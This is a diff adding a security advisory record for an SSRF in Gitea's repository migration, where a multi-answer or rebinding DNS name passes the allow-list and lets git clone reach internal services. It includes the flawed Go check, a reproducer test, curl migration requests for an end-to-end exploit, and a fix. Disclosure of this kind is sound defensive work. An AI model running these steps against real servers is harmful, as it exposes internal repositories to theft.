@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-h2x6-g7q6-344v",
+  "modified": "2026-07-21T20:45:36.225989042Z",
+  "published": "2026-07-21T20:37:45Z",
+  "aliases": [
+    "CVE-2026-58442"
+  ],
+  "summary": "Gitea: Repository migration SSRF via multi-answer DNS allow-list bypass",
+  "details": "### Summary\n\nGitea's repository migration URL validation can be bypassed when a migration hostname resolves to multiple IP addresses. The validation logic accepts the destination if **any** resolved IP is allowed, even if another resolved IP is loopback, private, or otherwise blocked. The later `git clone` operation resolves the hostname again outside of that validation decision, so it can connect to the internal address.\n\nAn authenticated low-privilege user who can create repository migrations can use an attacker-controlled DNS name to make Gitea connect to internal-only Git services and import their contents into a repository controlled by the attacker.\n\n### Details\n\nThe issue is in `services/migrations/migrate.go`, in the migration allow/block-list check.\n\nCurrent logic computes whether any resolved IP is allowed:\n\n```go\nvar ipAllowed bool\nvar ipBlocked bool\nfor _, addr := range addrList {\n    ipAllowed = ipAllowed || allowList.MatchIPAddr(addr)\n    ipBlocked = ipBlocked || blockList.MatchIPAddr(addr)\n}\n```\n\nThen, when an allow-list is active, the host is accepted if the hostname matches or `ipAllowed` is true:\n\n```go\nif !allowList.IsEmpty() {\n    if !allowList.MatchHostName(hostName) \u0026\u0026 !ipAllowed {\n        return \u0026git.ErrInvalidCloneAddr{Host: hostName, IsPermissionDenied: true}\n    }\n}\n```\n\nThis means a hostname resolving to both:\n\n- an allowed public IP, e.g. `1.2.3.4`\n- a blocked internal IP, e.g. `127.0.0.1`\n\npasses validation because the public IP sets `ipAllowed = true`.\n\nThe actual repository import is later performed by `git clone --mirror` via `MigrateRepositoryGitData` / `gitrepo.CloneExternalRepo`. That git subprocess performs its own DNS resolution and is not tied to the specific IP set that was validated earlier. If the hostname resolves, rotates, or is re-bound to the internal address at clone time, Gitea can connect to a destination the migration filter would reject if supplied directly.\n\nThe direct internal URL is correctly blocked, but the multi-answer hostname is accepted.\n\n### PoC\n\nI verified the vulnerable predicate locally against Gitea checkout:\n\n```text\ne8654c7e062431a521636703f47339cde64644fd\n```\n\nusing Dockerized Go tests with `golang:1.26.4`.\n\nThe local test proves:\n\n- `checkByAllowBlockList(\"loopback.example.test\", [127.0.0.1])` is rejected.\n- `checkByAllowBlockList(\"mixed.example.test\", [1.2.3.4, 127.0.0.1])` is accepted.\n\nMinimal reproducer at the validation layer:\n\n```go\nfunc TestMigrationMultiAnswerAnyAllowed(t *testing.T) {\n    old := setting.Migrations\n    t.Cleanup(func() { setting.Migrations = old })\n\n    setting.Migrations.AllowedDomains = \"\"\n    setting.Migrations.BlockedDomains = \"\"\n    setting.Migrations.AllowLocalNetworks = false\n    require.NoError(t, Init())\n\n    err := checkByAllowBlockList(\"mixed.example.test\", []net.IP{\n        net.ParseIP(\"1.2.3.4\"),\n        net.ParseIP(\"127.0.0.1\"),\n    })\n    require.NoError(t, err, \"mixed public+loopback answers should currently pass\")\n\n    err = checkByAllowBlockList(\"loopback.example.test\", []net.IP{\n        net.ParseIP(\"127.0.0.1\"),\n    })\n    require.Error(t, err, \"loopback-only answer should be rejected\")\n}\n```\n\nTo reproduce end-to-end:\n\n1. Run Gitea with repository migration enabled and `ALLOW_LOCALNETWORKS = false`.\n2. Create a normal non-admin user that can create repositories.\n3. Run an internal Git HTTP service reachable only from the Gitea server, for example on `127.0.0.1:18082`.\n4. Configure an attacker-controlled hostname so that DNS can return both a public address and `127.0.0.1`, or can return a public address during Gitea's pre-flight validation and `127.0.0.1` during the later git clone.\n5. Confirm the direct internal migration is rejected:\n\n```bash\ncurl -X POST http://GITEA/api/v1/repos/migrate \\\n  -H \"Authorization: token USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"clone_addr\": \"http://127.0.0.1:18082/repo.git\",\n    \"repo_name\": \"direct-internal\",\n    \"service\": \"git\",\n    \"private\": true\n  }'\n```\n\nExpected direct result:\n\n```json\n{\"message\":\"You can not import from disallowed hosts.\"}\n```\n\n6. Start a migration from the attacker-controlled multi-answer hostname:\n\n```bash\ncurl -X POST http://GITEA/api/v1/repos/migrate \\\n  -H \"Authorization: token USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"clone_addr\": \"http://mixed.example.test:18082/repo.git\",\n    \"repo_name\": \"multidns-ssrf\",\n    \"service\": \"git\",\n    \"private\": true\n  }'\n```\n\nExpected vulnerable result:\n\n- The migration request is accepted.\n- The git subprocess can connect to the internal address.\n- Internal repository contents are imported into the attacker's new Gitea repository.\n\n### Impact\n\nThis is a server-side request forgery in repository migration.\n\nAn authenticated user with permission to create repository migrations can make the Gitea server connect to internal-only network resources that are normally blocked by the migration SSRF filter. If the internal service is a Git repository or Git-compatible HTTP endpoint, its contents can be imported into an attacker-controlled repository and exfiltrated.\n\nPotentially impacted resources include:\n\n- internal Git repositories\n- localhost-only services\n- private network source-control services\n- metadata or internal infrastructure endpoints if reachable and compatible with the request path\n\nThe direct internal destination is rejected, but a multi-answer or rebindable DNS name can pass validation and later resolve to the internal address during the clone operation.\n\n### Suggested fix\n\nThe migration allow/block-list check should fail closed for multi-answer DNS:\n\n- reject if **any** resolved IP is blocked\n- require **all** resolved IPs to be allowed when an allow-list is active\n- treat an empty resolution result as not IP-allowed\n- ideally enforce the same destination policy at connection time, not only during pre-flight validation, to avoid DNS TOCTOU between validation and `git clone`\n\nFor example, instead of `ipAllowed = ipAllowed || allowList.MatchIPAddr(addr)`, initialize `ipAllowed` to `len(addrList) \u003e 0` and combine with logical AND:\n\n```go\nipAllowed := len(addrList) \u003e 0\nipBlocked := false\nfor _, addr := range addrList {\n    ipAllowed = ipAllowed \u0026\u0026 allowList.MatchIPAddr(addr)\n    ipBlocked = ipBlocked || blockList.MatchIPAddr(addr)\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.27.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-h2x6-g7q6-344v/GHSA-h2x6-g7q6-344v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-h2x6-g7q6-344v"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.27.0"
+    }
+  ]
+}
